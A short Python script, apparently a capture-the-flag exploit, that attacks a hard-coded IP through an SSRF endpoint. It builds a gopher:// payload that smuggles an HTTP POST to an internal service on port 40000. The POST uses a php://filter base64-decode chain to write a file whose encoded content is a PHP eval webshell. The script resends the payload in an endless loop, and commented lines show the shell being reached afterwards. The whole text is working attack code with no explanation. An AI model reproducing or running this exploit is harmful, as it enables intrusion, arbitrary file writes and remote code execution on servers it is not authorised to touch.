import requests
from urllib.parse import urlencode, quote_plus,quote
baseurl = "39.98.131.124"

def ssrf(url):
    burp0_url = "http://"+baseurl+"/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it="+url
    burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    return requests.get(burp0_url, headers=burp0_headers,proxies={"http":"http://127.0.0.1:8080"})

postdata = {
    'file' : 'php://filter/convert.base64-decode|convert.base64-decode/resource=fucker.php',
    'content':'UEQ5d2FIQWdaWFpoYkNna1gwZEZWRnN4WFNrNw'
}

postdata = urlencode(postdata,quote_via=quote_plus)

data='''POST / HTTP/1.1
Host: 127.0.0.1:40000
Cookie: PHPSESSID=ffffffffffffffffffffffff;
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: {len}

{data}'''.format(len = len(postdata),data = postdata).replace("\n","\r\n")

data = "gopher://127.0.0.1:40000/_"+quote(quote(data))
import time
while True:
    ssrf(data)
    time.sleep(1)
# print(data)
# print(ssrf(data).text)
# print(ssrf("http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=http://127.0.0.1:40000/uploads/ffffffffffffffffffffffff/fucker.php").text)